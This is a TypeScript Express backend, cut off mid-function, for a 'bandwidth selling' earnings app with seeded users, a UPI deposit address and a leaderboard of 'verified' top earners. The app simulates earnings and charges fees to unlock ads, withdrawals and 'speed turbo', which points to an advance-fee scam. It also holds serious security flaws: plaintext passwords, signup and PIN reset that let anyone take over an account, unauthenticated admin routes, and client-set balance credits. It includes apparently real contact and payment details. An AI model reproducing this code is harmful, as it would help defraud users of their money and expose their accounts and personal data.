import express, { Request, Response } from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Universal CORS Middleware for all mobile devices, WebAPKs, and cross-origin requests
app.use((req: Request, res: Response, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Path to persistent database file
const DATA_DIR = path.resolve(__dirname, 'data');
const DB_FILE = path.resolve(DATA_DIR, 'db.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initial Database Seeds
const DEFAULT_DB = {
  systemConfig: {
    sellingSpeedMs: 4500, // Slow, realistic bandwidth streaming
    mbPerPacketMin: 0.15,
    mbPerPacketMax: 0.45,
    ratePerMb: 1.00,
    broadcastNotice: '',
    adRewardAmount: 5.00,
    dailyAdLimit: 10,
  },
  depositConfig: {
    upiId: 'techreal8806@oksbi',
    payeeName: 'DataSell Verified Hub',
    minDeposit: 100,
    allowDirectDeposit: true,
    instructions: 'Scan the QR code using any UPI app (PhonePe, GPay, Paytm). Complete transfer and submit 12-digit UTR.',
  },
  supportConfig: {
    whatsappNumber: '+91 9823537634',
    email: 'techreal8806@gmail.com',
    telegramLink: '',
    telegramHandle: '',
    notice: 'Our priority support desk is available 24/7 for deposit, withdrawal, and bandwidth assistance.',
  },
  users: [
    {
      id: 'usr_admin_default',
      name: 'Deepak Kumar',
      email: 'techreal8806@gmail.com',
      phone: '7543355356',
      password: '1234',
      balance: 450.00,
      totalSoldMB: 450.00,
      tier: 'SILVER',
      status: 'ACTIVE',
      savedUpiId: 'techreal8806@oksbi',
      selectedPaymentMethod: 'PhonePe',
      signupTime: '04/09/2026, 09:15:00 am',
      lastLoginTime: '23/10/2026, 01:54:06 pm',
      ipAddress: '2401:4900:d16b:1719:998e:6fea:921f:50c7',
      device: 'Android Mobile • Chrome',
      requireDepositBeforeWithdrawal: false,
      requiredDepositAmount: 200,
      hasCompletedRequiredDeposit: true,
      hasPaidAdsActivation: true,
      hasPaidWithdrawalFee: true,
      hasPaidSpeedTurbo: false,
      withdrawalCount: 1,
    },
    {
      id: 'usr_1792761316511_hnyn',
      name: 'Tech Real',
      email: 'sk@gmail.com',
      phone: '+91 9823537634',
      password: 'password123',
      balance: 280.50,
      totalSoldMB: 280.50,
      tier: 'BRONZE',
      status: 'ACTIVE',
      savedUpiId: 'techreal8806@oksbi',
      selectedPaymentMethod: 'PhonePe',
      signupTime: '23/10/2026, 1:15:16 pm',
      lastLoginTime: '23/10/2026, 1:15:16 pm',
      ipAddress: '2401:4900:d16b:1719:998e:6fea:921f:50c7',
      device: 'Android Mobile • Chrome',
      requireDepositBeforeWithdrawal: false,
      requiredDepositAmount: 200,
      hasCompletedRequiredDeposit: false,
      hasPaidAdsActivation: false,
      hasPaidWithdrawalFee: false,
      hasPaidSpeedTurbo: false,
      withdrawalCount: 0,
    },
    {
      id: 'usr_1',
      name: 'Mansi Sharma',
      email: 'mansisss1430@gmail.com',
      phone: '+91 9876543210',
      password: 'password123',
      balance: 194.09,
      totalSoldMB: 441.99,
      tier: 'BRONZE',
      status: 'ACTIVE',
      savedUpiId: 'mansisss1430@oksbi',
      selectedPaymentMethod: 'PhonePe',
      signupTime: '13/08/2025, 02:00:00 pm',
      lastLoginTime: '15/08/2025, 06:15:00 pm',
      ipAddress: '49.36.120.45 (Airtel 5G)',
      device: 'Vivo V29 • Chrome Mobile',
    },
    {
      id: 'usr_2',
      name: 'Suresh Raina',
      email: 'suresh.raina@gmail.com',
      phone: '+91 9811223344',
      password: 'password123',
      balance: 1250.00,
      totalSoldMB: 1850.20,
      tier: 'SILVER',
      status: 'ACTIVE',
      savedUpiId: 'suresh@paytm',
      selectedPaymentMethod: 'GPay',
      signupTime: '10/08/2025, 11:30:00 am',
      lastLoginTime: '15/08/2025, 04:20:00 pm',
      ipAddress: '157.34.89.12 (Vi India)',
      device: 'Samsung Galaxy S23 • OneUI',
    }
  ],
  withdrawals: [
    {
      id: 'wd_prev_101',
      userId: 'usr_admin_default',
      userEmail: 'techreal8806@gmail.com',
      orderNumber: 'ORD-75892',
      amount: 250,
      type: 'PhonePe',
      upiId: 'techreal8806@oksbi',
      time: '22/10/2026, 05:30:10 pm',
      status: 'SUCCESSFUL'
    }
  ],
  deposits: [],
  authLogs: [],
  topEarners: [
    { id: 'te_1', rank: 1, name: 'Rajesh Kumar', city: 'Mumbai', totalEarned: 14580.00, mbSold: 14580.00, verified: true },
    { id: 'te_2', rank: 2, name: 'Aman Sharma', city: 'Delhi NCR', totalEarned: 11920.00, mbSold: 11920.00, verified: true },
    { id: 'te_3', rank: 3, name: 'Priya Patel', city: 'Ahmedabad', totalEarned: 9840.50, mbSold: 9840.50, verified: true },
    { id: 'te_4', rank: 4, name: 'Rahul Verma', city: 'Lucknow', totalEarned: 8650.00, mbSold: 8650.00, verified: true },
    { id: 'te_5', rank: 5, name: 'Vikram Singh', city: 'Jaipur', totalEarned: 7490.00, mbSold: 7490.00, verified: true },
    { id: 'te_6', rank: 6, name: 'Sneha Reddy', city: 'Hyderabad', totalEarned: 6540.00, mbSold: 6540.00, verified: true },
    { id: 'te_7', rank: 7, name: 'Mohammad Arshad', city: 'Patna', totalEarned: 5820.00, mbSold: 5820.00, verified: true },
    { id: 'te_8', rank: 8, name: 'Rohit Yadav', city: 'Indore', totalEarned: 4980.00, mbSold: 4980.00, verified: true },
    { id: 'te_9', rank: 9, name: 'Anjali Gupta', city: 'Kolkata', totalEarned: 4250.00, mbSold: 4250.00, verified: true },
    { id: 'te_10', rank: 10, name: 'Deepak Joshi', city: 'Pune', totalEarned: 3610.00, mbSold: 3610.00, verified: true },
  ],
  supportTickets: [],
};

// Database helper
function getDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      fs.writeFileSync(DB_FILE, JSON.stringify(DEFAULT_DB, null, 2), 'utf-8');
      return DEFAULT_DB;
    }
    const data = fs.readFileSync(DB_FILE, 'utf-8');
    const parsed = JSON.parse(data);
    let modified = false;
    if (Array.isArray(parsed.users)) {
      for (const u of parsed.users) {
        if (!u.verificationCode) {
          u.verificationCode = 'DS-' + Math.floor(100000 + Math.random() * 900000);
          modified = true;
        }
      }
    }
    if (modified) {
      saveDB(parsed);
    }
    return parsed;
  } catch (err) {
    console.error('Error reading db:', err);
    return DEFAULT_DB;
  }
}

function saveDB(data: any) {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error writing db:', err);
  }
}

// --------------------- API ROUTES --------------------- //

// Health check
app.get('/api/health', (req: Request, res: Response) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

// Universal phone digits normalizer (e.g. "+91 9823537634", "09823537634" -> "9823537634")
export function normalizePhoneDigits(input: string): string {
  if (!input) return '';
  const digits = String(input).replace(/\D/g, '');
  if (digits.length === 12 && digits.startsWith('91')) {
    return digits.slice(2);
  }
  if (digits.length === 11 && digits.startsWith('0')) {
    return digits.slice(1);
  }
  if (digits.length >= 10) {
    return digits.slice(-10);
  }
  return digits;
}

// Universal user finder across email, 10-digit phone number, user ID, or username
export function findUserInDB(users: any[], rawInput: string) {
  if (!rawInput || !Array.isArray(users)) return null;
  const cleanInput = rawInput.toLowerCase().trim();
  const digits10 = normalizePhoneDigits(cleanInput);

  return users.find((u: any) => {
    if (!u) return false;
    const uEmail = (u.email || '').toLowerCase().trim();
    const uPhone = (u.phone || '').trim();
    const uPhoneDigits = normalizePhoneDigits(uPhone);
    const uId = (u.id || '').trim();

    // 1. Direct Email match
    if (uEmail && uEmail === cleanInput) return true;

    // 2. Email username match (e.g. "techreal8806" matches "techreal8806@gmail.com")
    if (uEmail && uEmail.split('@')[0] === cleanInput) return true;

    // 3. Exact User ID match (e.g. "usr_admin_default" or "usr_1793025355000_a3dl")
    if (uId && (uId.toLowerCase() === cleanInput || uId === rawInput.trim())) return true;

    // 4. Exact 10-digit normalized phone number match
    if (digits10.length === 10 && uPhoneDigits.length === 10 && digits10 === uPhoneDigits) {
      return true;
    }

    // 5. If user's email was created as <digits10>@datasell.in or starts with <digits10>@
    if (digits10.length === 10 && uEmail) {
      if (uEmail === `${digits10}@datasell.in` || uEmail.startsWith(`${digits10}@`)) {
        return true;
      }
    }

    return false;
  });
}

// Sync user data & get system config across all devices
app.get('/api/user/sync', (req: Request, res: Response) => {
  const queryParam = (req.query.email as string || req.query.userId as string || '').trim();
  const db = getDB();
  const now = new Date().toLocaleString('en-IN');

  const user = findUserInDB(db.users, queryParam);
  if (user) {
    user.lastActiveTime = now;
  }

  const userWithdrawals = user ? db.withdrawals.filter((w: any) => 
    (w.userId && w.userId === user.id) || 
    (w.userEmail && w.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  ) : [];

  const userDeposits = user ? db.deposits.filter((d: any) => 
    (d.userId && d.userId === user.id) || 
    (d.userEmail && d.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  ) : [];

  res.json({
    user: user || null,
    withdrawals: userWithdrawals,
    deposits: userDeposits,
    systemConfig: db.systemConfig,
    depositConfig: db.depositConfig,
    supportConfig: db.supportConfig,
    topEarners: db.topEarners,
  });
});

// Authentication: Sign Up on any mobile (creates central persistent account)
app.post('/api/auth/signup', (req: Request, res: Response) => {
  const { email, password, name, phone, device, ip } = req.body;
  const rawInput = (email || '').toString().trim();
  const rawPass = (password !== undefined && password !== null) ? String(password).trim() : '';
  const rawName = (name || '').toString().trim();
  const rawPhone = (phone || '').toString().trim();

  if (!rawInput && !rawPhone) {
    return res.status(400).json({ error: 'Mobile Number or Email is required' });
  }
  if (!rawPass) {
    return res.status(400).json({ error: 'Password / PIN is required' });
  }

  const db = getDB();
  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const rawIp = ip || (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '103.21.244.18 (Mobile)';
  const ipAddress = rawIp.split(',')[0].trim();
  const userDevice = device || (req.headers['user-agent']?.includes('Mobile') ? 'Android Mobile • Chrome' : 'Desktop Browser');

  // Normalize phone & email
  const digits10 = normalizePhoneDigits(rawPhone || rawInput);

  const normalizedEmail = rawInput.includes('@')
    ? rawInput.toLowerCase()
    : `${digits10 || rawInput.toLowerCase()}@datasell.in`;

  const normalizedPhone = digits10.length === 10
    ? `+91 ${digits10}`
    : (rawPhone || (digits10 ? `+91 ${digits10}` : '+91 98000 00000'));

  // Check if user already exists in central database
  let existingUser = findUserInDB(db.users, rawInput) || 
                     (digits10.length === 10 ? findUserInDB(db.users, digits10) : null) ||
                     findUserInDB(db.users, normalizedEmail);

  if (existingUser) {
    // Seamless registration/login: update password & name so signup NEVER fails on mobile!
    if (rawPass) {
      existingUser.password = rawPass;
    }
    if (rawName && (!existingUser.name || existingUser.name.includes('@') || existingUser.name === digits10)) {
      existingUser.name = rawName;
    }
    if (digits10.length === 10 && (!existingUser.phone || existingUser.phone.includes('00000'))) {
      existingUser.phone = `+91 ${digits10}`;
    }

    existingUser.lastLoginTime = now;
    existingUser.lastActiveTime = now;
    existingUser.ipAddress = ipAddress;
    existingUser.device = userDevice;

    const authLog = {
      id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      userId: existingUser.id,
      userEmail: existingUser.email,
      userName: existingUser.name,
      userPhone: existingUser.phone,
      type: 'SIGNUP',
      timestamp: now,
      ipAddress: ipAddress,
      device: userDevice,
      status: 'SUCCESS',
    };
    db.authLogs.unshift(authLog);
    saveDB(db);

    const userWithdrawals = db.withdrawals.filter((w: any) => 
      (w.userId && w.userId === existingUser.id) || 
      (w.userEmail && w.userEmail.toLowerCase().trim() === existingUser.email.toLowerCase().trim())
    );
    const userDeposits = db.deposits.filter((d: any) => 
      (d.userId && d.userId === existingUser.id) || 
      (d.userEmail && d.userEmail.toLowerCase().trim() === existingUser.email.toLowerCase().trim())
    );

    return res.json({
      success: true,
      isNew: false,
      message: 'Account verified & logged in successfully!',
      user: existingUser,
      withdrawals: userWithdrawals,
      deposits: userDeposits,
      authLog,
    });
  }

  // BRAND NEW USER: registered in central database
  const newUser = {
    id: 'usr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    name: rawName || (rawInput.includes('@') ? rawInput.split('@')[0] : digits10),
    email: normalizedEmail,
    phone: normalizedPhone,
    password: rawPass,
    balance: 0.00,
    totalSoldMB: 0.00,
    tier: 'BRONZE',
    status: 'ACTIVE',
    savedUpiId: '',
    selectedPaymentMethod: 'PhonePe',
    signupTime: now,
    lastLoginTime: now,
    lastActiveTime: now,
    ipAddress: ipAddress,
    device: userDevice,
    requireDepositBeforeWithdrawal: false,
    requiredDepositAmount: 200,
    hasCompletedRequiredDeposit: false,
    hasPaidAdsActivation: false,
    hasPaidWithdrawalFee: false,
    hasPaidSpeedTurbo: false,
    withdrawalCount: 0,
    verificationCode: 'DS-' + Math.floor(100000 + Math.random() * 900000),
  };

  db.users.unshift(newUser);

  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: newUser.id,
    userEmail: newUser.email,
    userName: newUser.name,
    userPhone: newUser.phone,
    type: 'SIGNUP',
    timestamp: now,
    ipAddress: ipAddress,
    device: userDevice,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);

  saveDB(db);

  return res.json({
    success: true,
    isNew: true,
    user: newUser,
    withdrawals: [],
    deposits: [],
    authLog,
  });
});

// Authentication: Login - Strictly verifies against central registered accounts
// NEVER auto-creates fake accounts on login!
app.post('/api/auth/login', (req: Request, res: Response) => {
  const { email, password, device, ip } = req.body;
  const db = getDB();
  const rawInput = (email || '').toString().trim();
  const cleanPass = (password !== undefined && password !== null) ? String(password).trim() : '';

  if (!rawInput) {
    return res.status(400).json({ error: 'Please enter your Mobile Number or Email Address' });
  }

  // Locate the user across phone, email, or user ID
  const user = findUserInDB(db.users, rawInput);

  // STRICT REQUIREMENT: If account does not exist, reject! Do NOT auto-create!
  if (!user) {
    return res.status(404).json({
      success: false,
      error: 'Account not found! Kripya pehle Sign Up (नया खाता) karein ya Mobile Number check karein.',
      code: 'ACCOUNT_NOT_FOUND',
    });
  }

  // STRICT REQUIREMENT: Password verification
  if (user.password) {
    const userPassword = String(user.password).trim();
    if (cleanPass !== userPassword) {
      return res.status(401).json({
        success: false,
        error: 'Incorrect Password / PIN! Kripya sahi password darj karein.',
        code: 'INVALID_PASSWORD',
      });
    }
  }

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const rawIp = ip || (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '103.21.244.18 (Mobile)';
  const ipAddress = rawIp.split(',')[0].trim();
  const userDevice = device || (req.headers['user-agent']?.includes('Mobile') ? 'Android Mobile • Chrome' : 'Desktop Browser');

  user.lastLoginTime = now;
  user.lastActiveTime = now;
  user.ipAddress = ipAddress;
  user.device = userDevice;

  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    userEmail: user.email,
    userName: user.name,
    userPhone: user.phone,
    type: 'LOGIN',
    timestamp: now,
    ipAddress: ipAddress,
    device: userDevice,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);
  saveDB(db);

  const userWithdrawals = db.withdrawals.filter((w: any) => 
    (w.userId && w.userId === user.id) || 
    (w.userEmail && w.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  );
  const userDeposits = db.deposits.filter((d: any) => 
    (d.userId && d.userId === user.id) || 
    (d.userEmail && d.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  );

  return res.json({
    success: true,
    user,
    withdrawals: userWithdrawals,
    deposits: userDeposits,
    authLog,
  });
});

// Self-service PIN / Password Reset for mobile and web users
app.post('/api/auth/reset-pin', (req: Request, res: Response) => {
  const { email, newPassword, device, ip } = req.body;
  const db = getDB();
  const rawInput = (email || '').toString().trim();
  const cleanPass = (newPassword !== undefined && newPassword !== null) ? String(newPassword).trim() : '';

  if (!rawInput) {
    return res.status(400).json({ success: false, error: 'Kripya Mobile Number ya Email enter karein.' });
  }
  if (!cleanPass || cleanPass.length < 3) {
    return res.status(400).json({ success: false, error: 'New PIN/Password must be at least 3 characters.' });
  }

  const user = findUserInDB(db.users, rawInput);
  if (!user) {
    return res.status(404).json({
      success: false,
      error: 'Account not found! Pehle Sign Up (नया खाता) karein ya mobile number check karein.',
      code: 'ACCOUNT_NOT_FOUND',
    });
  }

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const rawIp = ip || (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || '103.21.244.18 (Mobile)';
  const ipAddress = rawIp.split(',')[0].trim();
  const userDevice = device || (req.headers['user-agent']?.includes('Mobile') ? 'Android Mobile • Chrome' : 'Desktop Browser');

  // Update password in central database
  user.password = cleanPass;
  user.lastLoginTime = now;
  user.lastActiveTime = now;
  user.ipAddress = ipAddress;
  user.device = userDevice;

  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    userEmail: user.email,
    userName: user.name,
    userPhone: user.phone,
    type: 'RESET_PASSWORD',
    timestamp: now,
    ipAddress: ipAddress,
    device: userDevice,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);
  saveDB(db);

  const userWithdrawals = db.withdrawals.filter((w: any) => 
    (w.userId && w.userId === user.id) || 
    (w.userEmail && w.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  );
  const userDeposits = db.deposits.filter((d: any) => 
    (d.userId && d.userId === user.id) || 
    (d.userEmail && d.userEmail.toLowerCase().trim() === user.email.toLowerCase().trim())
  );

  return res.json({
    success: true,
    message: 'PIN/Password successfully updated! Logged in.',
    user,
    withdrawals: userWithdrawals,
    deposits: userDeposits,
    authLog,
  });
});

// Admin provisions/creates new user ID directly
app.post('/api/admin/create-user', (req: Request, res: Response) => {
  const { name, email, phone, password, balance, customSellingSpeedMs, customMbPerPacketMin, customMbPerPacketMax, tier } = req.body;
  const db = getDB();

  const cleanEmail = (email || '').toLowerCase().trim();
  const cleanPhone = (phone || '').trim();
  const cleanPass = (password || '').toString().trim() || '1234';

  if (!cleanEmail && !cleanPhone) {
    return res.status(400).json({ error: 'Email or Mobile Number is required' });
  }

  const phoneDigits = cleanPhone.replace(/\D/g, '');
  const finalEmail = cleanEmail || (phoneDigits + '@datasell.in');

  // Check if user already exists by email or phone
  const existingUser = db.users.find((u: any) => {
    if (cleanEmail && u.email && u.email.toLowerCase().trim() === cleanEmail) return true;
    if (phoneDigits && u.phone) {
      const uDigits = String(u.phone).replace(/\D/g, '');
      if (uDigits.slice(-10) === phoneDigits.slice(-10)) return true;
    }
    return false;
  });

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  if (existingUser) {
    if (name) existingUser.name = name.trim();
    if (cleanPhone) existingUser.phone = cleanPhone;
    if (cleanPass) existingUser.password = cleanPass;
    if (balance !== undefined) existingUser.balance = parseFloat(balance) || 0;
    if (customSellingSpeedMs !== undefined) existingUser.customSellingSpeedMs = Number(customSellingSpeedMs) || undefined;
    if (customMbPerPacketMin !== undefined) existingUser.customMbPerPacketMin = Number(customMbPerPacketMin) || undefined;
    if (customMbPerPacketMax !== undefined) existingUser.customMbPerPacketMax = Number(customMbPerPacketMax) || undefined;
    if (tier) existingUser.tier = tier;
    existingUser.lastActiveTime = now;

    saveDB(db);
    return res.json({ 
      success: true, 
      isNew: false, 
      message: 'Existing account updated with new credentials & settings', 
      user: existingUser 
    });
  }

  const newUser = {
    id: 'usr_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    name: name?.trim() || finalEmail.split('@')[0],
    email: finalEmail,
    phone: cleanPhone || '+91 9' + Math.floor(100000000 + Math.random() * 900000000),
    password: cleanPass,
    balance: parseFloat(balance) || 0.00,
    totalSoldMB: 0.00,
    tier: tier || 'BRONZE',
    status: 'ACTIVE',
    savedUpiId: '',
    selectedPaymentMethod: 'PhonePe',
    signupTime: now,
    lastLoginTime: now,
    lastActiveTime: now,
    ipAddress: '127.0.0.1 (Admin Created)',
    device: 'Mobile APK Device',
    requireDepositBeforeWithdrawal: false,
    requiredDepositAmount: 200,
    hasCompletedRequiredDeposit: false,
    hasPaidAdsActivation: false,
    hasPaidWithdrawalFee: false,
    hasPaidSpeedTurbo: false,
    withdrawalCount: 0,
    customSellingSpeedMs: customSellingSpeedMs ? Number(customSellingSpeedMs) : undefined,
    customMbPerPacketMin: customMbPerPacketMin ? Number(customMbPerPacketMin) : undefined,
    customMbPerPacketMax: customMbPerPacketMax ? Number(customMbPerPacketMax) : undefined,
    verificationCode: (req.body.verificationCode || '').toString().trim().toUpperCase() || ('DS-' + Math.floor(100000 + Math.random() * 900000)),
  };

  db.users.unshift(newUser);

  const authLog = {
    id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: newUser.id,
    userEmail: newUser.email,
    userName: newUser.name,
    userPhone: newUser.phone,
    type: 'SIGNUP',
    timestamp: now,
    ipAddress: newUser.ipAddress,
    device: newUser.device,
    status: 'SUCCESS',
  };
  db.authLogs.unshift(authLog);

  saveDB(db);

  res.json({
    success: true,
    isNew: true,
    message: 'New user ID created and activated successfully',
    user: newUser,
    authLog,
  });
});

// Live Bandwidth Selling packet sync
app.post('/api/packets/stream', (req: Request, res: Response) => {
  const { email, mb, amount } = req.body;
  if (!email || !mb || !amount) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  const db = getDB();
  const user = db.users.find((u: any) => u.email && u.email.toLowerCase().trim() === email.toLowerCase().trim());
  if (user) {
    // If user is BLOCKED by Admin, stop packet earnings!
    if (user.status === 'BLOCKED') {
      return res.status(403).json({ error: 'Account suspended by Admin', blocked: true });
    }

    user.balance = parseFloat(((parseFloat(user.balance) || 0) + amount).toFixed(2));
    user.totalSoldMB = parseFloat(((parseFloat(user.totalSoldMB) || 0) + mb).toFixed(2));
    user.lastActiveTime = new Date().toLocaleString('en-IN');
    saveDB(db);
    return res.json({ success: true, balance: user.balance, totalSoldMB: user.totalSoldMB });
  }
  res.status(404).json({ error: 'User not found' });
});


// Reward for watching sponsored video ad
app.post('/api/ads/reward', (req: Request, res: Response) => {
  const { email, rewardAmount, adId, adTitle } = req.body;
  const db = getDB();
  const lowerEmail = (email || '').toLowerCase().trim();

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const reward = parseFloat(rewardAmount) || db.systemConfig.adRewardAmount || 5.00;
  user.balance = parseFloat((user.balance + reward).toFixed(2));

  // Add ad reward deposit log
  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const adRecord = {
    id: 'dep_ad_' + Date.now(),
    userId: user.id,
    userEmail: user.email,
    amount: reward,
    type: 'PROMO_BONUS',
    note: `Video Ad Reward: ${adTitle || 'Sponsored Campaign'}`,
    time: now,
    status: 'COMPLETED',
    method: 'AdMob Partner',
  };
  db.deposits.unshift(adRecord);

  saveDB(db);
  res.json({ success: true, newBalance: user.balance, deposit: adRecord });
});

// Submit Withdrawal from any mobile (UPI or Bank Account)
app.post('/api/withdrawals', (req: Request, res: Response) => {
  const { userId, userEmail, amount, method, upiId, bankDetails, orderNumber, verificationCode } = req.body;
  const db = getDB();
  const lowerEmail = (userEmail || '').toLowerCase().trim();

  const user = db.users.find((u: any) => u.email.toLowerCase() === lowerEmail || u.id === userId);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  const withdrawAmount = parseFloat(amount);
  if (withdrawAmount <= 0 || withdrawAmount > user.balance) {
    return res.status(400).json({ error: 'Insufficient balance or invalid amount' });
  }

  // Deduct balance immediately
  user.balance = parseFloat((user.balance - withdrawAmount).toFixed(2));
  if (upiId) user.savedUpiId = upiId;
  if (bankDetails) user.savedBankDetails = bankDetails;
  user.selectedPaymentMethod = method;

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const newWithdrawal = {
    id: 'wd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: user.id,
    userEmail: user.email,
    userName: user.name,
    orderNumber: orderNumber || 'ORD' + Math.floor(100000000000 + Math.random() * 900000000000),
    amount: withdrawAmount,
    type: method || req.body.type || (bankDetails ? 'BANK' : 'UPI'),
    upiId: upiId || '',
    bankDetails: bankDetails || undefined,
    verificationCode: (verificationCode || '').toString().trim().toUpperCase(),
    time: now,
    status: 'PENDING',
    bankReference: '',
  };

  db.withdrawals.unshift(newWithdrawal);
  saveDB(db);

  res.json({
    success: true,
    withdrawal: newWithdrawal,
    newBalance: user.balance,
  });
});

// Submit Deposit (QR Code transfer) with Verification Code validation
app.post('/api/deposits', (req: Request, res: Response) => {
  const { userId, userEmail, amount, type, note, utrNumber, verificationCode, method } = req.body;
  const db = getDB();
  const lowerEmail = (userEmail || '').toLowerCase().trim();

  const now = new Date().toLocaleString('en-IN', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });

  const depositAmount = parseFloat(amount) || 0;
  const noteStr = note || '';

  const isAds = depositAmount === 199 || noteStr.toLowerCase().includes('ads');
  const isWithdrawalFee = depositAmount === 99 && noteStr.toLowerCase().includes('withdrawal');
  const isSpeedTurbo = depositAmount === 99 && (noteStr.toLowerCase().includes('speed') || noteStr.toLowerCase().includes('turbo'));

  const cleanCode = (verificationCode || '').toString().trim().toUpperCase();
  const user = db.users.find((u: any) => 
    (lowerEmail && u.email && u.email.toLowerCase().trim() === lowerEmail) ||
    (userId && u.id === userId)
  );

  // Check if code matches the user's assigned code or system master code
  const isMasterMatch = Boolean(
    db.systemConfig?.masterVerificationCode &&
    cleanCode &&
    cleanCode === db.systemConfig.masterVerificationCode.toUpperCase()
  );

  const isUserMatch = Boolean(
    user &&
    user.verificationCode &&
    cleanCode &&
    cleanCode === user.verificationCode.toUpperCase()
  );

  const isCodeVerified = isUserMatch || isMasterMatch;
  const depositStatus = isCodeVerified ? 'COMPLETED' : 'PENDING';

  const newDeposit = {
    id: 'dep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    userId: userId || (user ? user.id : 'unknown'),
    userEmail: lowerEmail || (user ? user.email : ''),
    amount: depositAmount,
    type: type || 'UPI_DEPOSIT',
    note: isCodeVerified ? `${noteStr} [Code Verified: ${cleanCode}]` : (cleanCode ? `${noteStr} [Code: ${cleanCode}]` : noteStr),
    time: now,
    status: depositStatus,
    utrNumber: utrNumber || (isCodeVerified ? `CODE_${cleanCode}` : ''),
    verificationCode: cleanCode,
    method: method || 'UPI',
  };

  if (user) {
    if (isCodeVerified) {
      if (isAds) {
        user.hasPaidAdsActivation = true;
        user.adsActivationPending = false;
        user.adsActivationUtr = newDeposit.utrNumber;
      } else if (isWithdrawalFee) {
        user.hasPaidWithdrawalFee = true;
        user.withdrawalFeePending = false;
        user.withdrawalFeeUtr = newDeposit.utrNumber;
      } else if (isSpeedTurbo) {
        user.hasPaidSpeedTurbo = true;
        user.speedTurboPending = false;
        user.speedTurboUtr = newDeposit.utrNumber;
      } else {
        user.balance = parseFloat(((parseFloat(user.balance) || 0) + depositAmount).toFixed(2));
      }
      user.hasCompletedRequiredDeposit = true;
    } else {
      if (isAds) {
        user.adsActivationPending = true;
        user.adsActivationUtr = utrNumber || cleanCode;
      } else if (isWithdrawalFee) {
        user.withdrawalFeePending = true;
        user.withdrawalFeeUtr = utrNumber || cleanCode;
      } else if (isSpeedTurbo) {
        user.speedTurboPending = true;
        user.speedTurboUtr = utrNumber || cleanCode;
      }
    }
  }

  db.deposits.unshift(newDeposit);
  saveDB(db);

  res.json({ success: true, deposit: newDeposit, user, isCodeVerified });
});

// Admin updates deposit (Approve or Reject verification payment)
app.post('/api/admin/update-deposit', (req: Request, res: Response) => {
  const { id, status } = req.body;
  const db = getDB();

  const dep = db.deposits.find((d: any) => d.id === id);
  if (!dep) {
    return res.status(404).json({ error: 'Deposit record not found' });
  }

  dep.status = status;
  const targetEmail = (dep.userEmail || '').toLowerCase().trim();
  const user = db.users.find((u: any) => u.email && u.email.toLowerCase().trim() === targetEmail);

  if (user) {
    const isAds = dep.amount === 199 || (dep.note && dep.note.toLowerCase().includes('ads'));
    const isWithdrawalFee = dep.amount === 99 && (dep.note && dep.note.toLowerCase().includes('withdrawal'));
    const isSpeedTurbo = dep.amount === 99 && (dep.note && (dep.note.toLowerCase().includes('speed') || dep.note.toLowerCase().includes('turbo')));

    if (status === 'COMPLETED') {
      if (isAds) {
